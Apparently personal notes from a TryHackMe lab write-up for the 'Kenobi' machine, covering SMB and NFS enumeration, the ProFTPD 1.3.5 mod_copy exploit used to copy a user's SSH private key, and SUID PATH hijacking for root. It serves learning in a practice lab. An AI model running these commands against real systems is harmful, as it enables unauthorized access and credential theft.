# Kenobi — TryHackMe
## Info
- OS: Ubuntu
- Ports: 21 (FTP), 22 (SSH), 80, 111 (NFS), 139, 445 (SMB)

## Enumeration
- nmap -p 445 --script=smb-enum-shares target
- smbclient //target/anonymous -N
- smbget -R smb://target/anonymous
- found log.txt — SSH key info + ProFTPD version

## Vulnerability
- ProFTPD 1.3.5 — mod_copy exploit
- allows unauthenticated file copy via SITE CPFR/CPTO

## Exploitation
- nc target 21
- SITE CPFR /home/kenobi/.ssh/id_rsa
- SITE CPTO /var/ftp/pub/id_rsa
- mount NFS share: sudo mount target:/var /mnt/kenobiNFS
- copy id_rsa from mount
- chmod 600 id_rsa
- ssh -i id_rsa kenobi@target

## Privilege Escalation
- find / -perm -u=s -type f 2>/dev/null
- /usr/bin/menu has SUID
- strings /usr/bin/menu — calls curl without full path
- PATH manipulation to hijack curl and get root

## Lessons
- NFS mounts can expose sensitive files
- always check FTP version and searchsploit it
- PATH hijacking when SUID binary calls commands without full path
